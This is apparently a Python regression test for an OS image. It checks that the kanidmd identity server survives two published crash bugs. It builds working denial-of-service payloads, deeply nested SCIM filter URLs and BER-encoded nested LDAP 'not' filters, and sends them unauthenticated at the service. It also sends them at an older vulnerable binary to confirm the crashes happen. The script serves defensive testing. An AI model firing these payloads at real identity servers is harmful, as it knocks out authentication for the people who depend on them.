#!/usr/bin/env python3
"""Attacks the published crashes against a booted image, unauthenticated: the deeply nested SCIM filter
(GHSA-2pm5-6m23-h692) and the nested LDAP filter (GHSA-qcrp-p3rq-pffr). Asks kanidmd directly on
loopback, because a block at the front must not be the only reason it survives, and then through the
front. LDAP is off in the image, so it is switched on for this run alone.

  OS_WORK=... OS_IDP_PORT=8471 os/tests/kanidm-attacks.py [path/to/kanidmd to attack instead, with a new db]
"""
import base64, sys

from kanidm_lib import IDP, curl, serial

LDAP_PORT = 3636
SCIM_DEPTHS = (200, 5000, 12000, 30000)
LDAP_DEPTHS = (2000, 50000, 200000)
LOG_MATCH = "stack overflow|SIGABRT|SIGSEGV|core-dump|Main process exited"
failed = []


def check(name, ok, detail=""):
    """Records and prints one result."""
    print(f"{'PASS' if ok else 'FAIL'}  {name}  {detail}", flush=True)
    if not ok:
        failed.append(name)


def service_state():
    """The PID and restart count: a crash changes one or the other."""
    return serial("systemctl show kanidmd -p MainPID -p NRestarts --value | tr '\\n' ' '", 10).split()[-2:]


def ber_length(size):
    """A BER definite length."""
    if size < 0x80:
        return bytes([size])
    raw = size.to_bytes((size.bit_length() + 7) // 8, "big")
    return bytes([0x80 | len(raw)]) + raw


def ber(tag, body):
    """One BER element."""
    return bytes([tag]) + ber_length(len(body)) + body


def nested_ldap_search(depth):
    """An LDAP search whose filter is `not` nested `depth` deep. Built from the inside out, in one pass."""
    inner = ber(0x87, b"cn")
    chunks, size = [inner], len(inner)
    for _ in range(depth):
        head = bytes([0xA2]) + ber_length(size)
        chunks.append(head)
        size += len(head)
    filter_bytes = b"".join(reversed(chunks))
    search = (ber(0x04, b"") + ber(0x0A, b"\x00") + ber(0x0A, b"\x00") + ber(0x02, b"\x00") + ber(0x02, b"\x00")
              + ber(0x01, b"\x00") + filter_bytes + ber(0x30, b""))
    return ber(0x30, ber(0x02, b"\x01") + ber(0x63, search))


def put_file(path, data):
    """Writes bytes on the machine through the serial shell, in short lines the terminal can take."""
    text = base64.b64encode(data).decode()
    serial(f": > {path}.b64", 5)
    for start in range(0, len(text), 2000):
        serial(f"echo {text[start:start + 2000]} >> {path}.b64", 5)
    serial(f"base64 -d {path}.b64 > {path}; rm {path}.b64; wc -c {path}", 10)


def attack_scim(port):
    """Unauthenticated, directly at kanidmd. The URL is built on the machine, since it is too long to type."""
    for depth in SCIM_DEPTHS:
        for shape, opening in (("parens", "("), ("not", "not%20(")):
            answer = serial(
                f"o=$(printf '{opening}%.0s' $(seq 1 {depth})); c=$(printf ')%.0s' $(seq 1 {depth})); "
                f"printf 'url = \"https://127.0.0.1:{port}/scim/v1/Entry?filter=%s\"\\n' \"${{o}}name%20pr${{c}}\" > /run/scim.cfg; "
                "curl -sk -m 20 -o /dev/null -w 'code=%{http_code}' -K /run/scim.cfg; rm /run/scim.cfg", 40)
            print(f"INFO  SCIM {shape} depth {depth} at kanidmd: {answer[-12:]}", flush=True)


def attack_ldap(port):
    """Unauthenticated, over LDAPS, before any bind."""
    for depth in LDAP_DEPTHS:
        payload = nested_ldap_search(depth)
        if len(payload) > 700_000:
            print(f"INFO  LDAP depth {depth}: {len(payload)} bytes, past what the shell can carry; skipped", flush=True)
            continue
        put_file("/run/ldap.ber", payload)
        answer = serial(f"(cat /run/ldap.ber; sleep 2) | timeout 15 openssl s_client -quiet -connect 127.0.0.1:{port} 2>&1 | head -c 200 | wc -c", 25)
        print(f"INFO  LDAP nested depth {depth} ({len(payload)} bytes): reply bytes {answer[-6:].strip()}", flush=True)
    serial("rm -f /run/ldap.ber", 5)


def installed_service():
    """The image's kanidmd with LDAP on for this run, then the same attacks, then LDAP off again."""
    drop_in = "/run/systemd/system/kanidmd.service.d"
    serial(f"mkdir -p {drop_in}; printf '[Service]\\nEnvironment=KANIDM_LDAPBINDADDRESS=127.0.0.1:{LDAP_PORT}\\n' > {drop_in}/ldap.conf; "
           "systemctl daemon-reload; systemctl restart kanidmd; sleep 6", 40)
    print("INFO  LDAP listening for the test:", serial(f"ss -lntH | grep -c :{LDAP_PORT}", 8)[-3:].strip(), flush=True)
    before = service_state()
    attack_scim(8444)
    attack_ldap(LDAP_PORT)
    after = service_state()
    crashes = serial(f"journalctl -u kanidmd --since '-4min' --no-pager | grep -cE '{LOG_MATCH}'", 10)[-3:].strip()
    check("kanidmd survives both attacks", before == after and crashes.endswith("0"), f"before {before} after {after} crash lines {crashes}")
    front = curl(f"{IDP}/scim/v1/Entry?filter=" + "(" * 2000 + "name%20pr" + ")" * 2000)[0]
    status = curl(f"{IDP}/status")[0]
    print(f"INFO  the same filter through the front: {front}; /status: {status}", flush=True)
    check("and still answers", status == 200)
    serial(f"rm -rf {drop_in}; systemctl daemon-reload; systemctl restart kanidmd; sleep 6", 40)
    check("LDAP is off in the image", serial("ss -lntpH | grep kanidmd | grep -vc :8444", 8)[-3:].strip().endswith("0"))
    return status


def control_binary(path):
    """A vulnerable release, on its own port and database, to prove the attacks are real."""
    conf = "/run/control.toml"
    serial("mkdir -p /run/control; chown kanidm /run/control; "
           f"sed -e 's#127.0.0.1:8444#127.0.0.1:9544#' -e 's#/var/lib/kanidm/kanidm.db#/run/control/k.db#' "
           f"-e '/online_backup/,$d' /etc/kanidm/server.toml > {conf}; cp /var/lib/kanidm/tls-*.pem /run/control/; chown kanidm /run/control/*; "
           f"sed -i 's#/var/lib/kanidm/tls#/run/control/tls#' {conf}; "
           f"echo 'ldapbindaddress = \"127.0.0.1:9636\"' > /run/control/head; cat /run/control/head {conf} > /run/control/c.toml", 15)
    for name, attack, port in (("SCIM", attack_scim, 9544), ("LDAP", attack_ldap, 9636)):
        serial(f"systemd-run --unit=kanidm-control --uid=kanidm --working-directory=/run/control {path} server -c /run/control/c.toml; sleep 10", 30)
        running = serial("systemctl is-active kanidm-control", 8)[-8:]
        print(f"INFO  control {name}: running before: {running.strip()}", flush=True)
        attack(port)
        result = serial("systemctl is-active kanidm-control; journalctl -u kanidm-control --no-pager | grep -iE "
                        f"'{LOG_MATCH}' | tail -2 | cut -c1-140; systemctl stop kanidm-control; systemctl reset-failed kanidm-control", 20)
        print(f"INFO  control {name} after the attack: {result[-260:]}", flush=True)


def main():
    """Attacks what is installed, or a given older binary."""
    if len(sys.argv) > 1:
        control_binary(sys.argv[1])
        return 0
    installed_service()
    print("FAILED: " + ", ".join(failed) if failed else "ALL PASSED")
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(main())
